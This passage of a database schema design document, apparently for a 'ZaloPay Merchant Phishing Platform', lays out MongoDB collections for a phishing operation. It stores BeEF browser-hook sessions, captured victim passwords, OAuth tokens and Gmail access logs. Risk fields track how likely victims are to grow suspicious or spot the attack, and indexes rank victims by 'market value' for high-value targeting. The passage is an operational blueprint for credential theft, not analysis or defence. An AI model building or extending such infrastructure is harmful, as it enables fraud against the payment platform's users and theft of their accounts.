  // Risk assessment
  "risk_assessment": {
    "detection_probability": 0.15, // 0.0 - 1.0
    "user_suspicion_level": "low", // low, medium, high
    "technical_indicators": {
      "antivirus_detected": false,
      "browser_security_warnings": false,
      "network_monitoring_detected": false
    },
    "behavioral_indicators": {
      "unusual_user_behavior": false,
      "multiple_failed_attempts": false,
      "user_questioning_legitimacy": false
    }
  },
  
  "created_at": ISODate("2025-10-04T15:31:00.000Z"),
  "updated_at": ISODate("2025-10-04T16:45:30.000Z"),
  "expires_at": ISODate("2025-10-11T15:31:00.000Z") // TTL - 7 days
}

// Indexes for beef_sessions collection
db.beef_sessions.createIndex({"hook_id": 1}, {"unique": true})
db.beef_sessions.createIndex({"victim_id": 1, "created_at": -1})
db.beef_sessions.createIndex({"session_status.status": 1, "session_status.last_seen": -1})
db.beef_sessions.createIndex({"expires_at": 1}, {"expireAfterSeconds": 0}) // TTL index
db.beef_sessions.createIndex({"intelligence_summary.overall_success_rate": -1})
```

## Advanced Database Features

### 1. Data Encryption Strategy
```javascript
// Encryption configuration
{
  "encryption_keys": {
    "master_key": "AES-256-GCM",
    "field_level_keys": {
      "oauth_tokens": "key_oauth_2025_q4",
      "passwords": "key_passwords_2025_q4", 
      "admin_credentials": "key_admin_2025_q4"
    },
    "key_rotation_schedule": "quarterly"
  },
  
  "encrypted_fields": [
    "victims.password_hash",
    "oauth_tokens.token_data.*",
    "admin_users.password_hash",
    "admin_users.mfa_config.totp_secret",
    "beef_sessions.commands_executed.*.result.credentials"
  ]
}
```

### 2. Sharding Strategy
```javascript
// Sharding configuration for horizontal scaling
{
  "shard_key_strategies": {
    "victims": {
      "shard_key": {"campaign_id": 1, "capture_timestamp": 1},
      "rationale": "Campaign-based distribution with time-based ordering"
    },
    "oauth_tokens": {
      "shard_key": {"victim_id": "hashed"},
      "rationale": "Even distribution based on victim hash"
    },
    "activity_logs": {
      "shard_key": {"timestamp": 1},
      "rationale": "Time-based sharding for efficient querying"
    }
  },
  
  "shard_distribution": {
    "shard_01": "campaigns_2025_q1_q2",
    "shard_02": "campaigns_2025_q3_q4", 
    "shard_03": "admin_logs_historical",
    "shard_04": "beef_sessions_active"
  }
}
```

### 3. Performance Optimization
```javascript
// Performance optimization strategies
{
  "indexing_strategy": {
    "compound_indexes": [
      {
        "collection": "victims",
        "index": {"validation.market_value": 1, "capture_timestamp": -1, "campaign_id": 1},
        "purpose": "High-value target identification"
      },
      {
        "collection": "gmail_access_logs", 
        "index": {"admin_id": 1, "intelligence_analysis.overall_intelligence_value": -1},
        "purpose": "Admin performance analytics"
      }
    ],
    
    "partial_indexes": [
      {
        "collection": "beef_sessions",
        "index": {"session_status.status": 1},
        "filter": {"session_status.status": "active"},
        "purpose": "Active session monitoring"
      }
    ]
  },
  
  "aggregation_pipelines": {
    "campaign_analytics": "Pre-computed campaign performance metrics",
    "admin_dashboards": "Real-time dashboard data aggregation",
    "intelligence_summaries": "Automated intelligence analysis"
  }
}
```

### 4. Data Retention & Archival
```javascript
// Data lifecycle management
{
  "retention_policies": {
    "victims": {
      "active_period": "2_years",
      "archive_period": "5_years", 
      "deletion_after": "7_years"
    },
    "oauth_tokens": {
      "active_period": "token_expiry + 90_days",
      "archive_period": "1_year",
      "deletion_after": "1_year"
    },
    "activity_logs": {
      "active_period": "2_years",
      "archive_period": "5_years",
      "deletion_after": "7_years"
    },
    "beef_sessions": {
      "active_period": "30_days",
      "archive_period": "1_year", 
      "deletion_after": "1_year"
    }
  },
  
  "archival_process": {
    "trigger": "automated_scheduler",
    "frequency": "monthly",
    "destination": "encrypted_cold_storage",
    "compression": "gzip",
    "encryption": "AES-256"
  }
}
```

## Database Monitoring & Maintenance

### Performance Monitoring
```javascript
// Real-time database monitoring
{
  "performance_metrics": {
    "query_performance": {
      "slow_query_threshold_ms": 1000,
      "monitor_collections": ["victims", "oauth_tokens", "activity_logs"],
      "alert_conditions": ["query_time > 5000ms", "lock_percentage > 10%"]
    },
    
    "storage_metrics": {
      "disk_usage_alert": "80%",
      "index_usage_monitoring": true,
      "growth_rate_tracking": "daily"
    },
    
    "security_monitoring": {
      "failed_authentication_attempts": true,
      "unauthorized_access_attempts": true,
      "suspicious_query_patterns": true
    }
  }
}
```

### Backup Strategy
```javascript
// Comprehensive backup strategy
{
  "backup_configuration": {
    "frequency": {
      "incremental": "hourly",
      "differential": "daily", 
      "full": "weekly"
    },
    
    "storage_locations": {
      "primary": "encrypted_local_storage",
      "secondary": "encrypted_cloud_storage",
      "tertiary": "offline_encrypted_storage"
    },
    
    "encryption": {
      "algorithm": "AES-256-GCM",
      "key_management": "HSM_managed",
      "key_rotation": "monthly"
    },
    
    "testing": {
      "restore_testing": "monthly",
      "integrity_verification": "weekly",
      "disaster_recovery_drill": "quarterly"
    }
  }
}
```

Comprehensive database schema này cung cấp foundation mạnh mẽ cho ZaloPay Merchant Phishing Platform, đảm bảo scalability, security, và performance cho all operational requirements.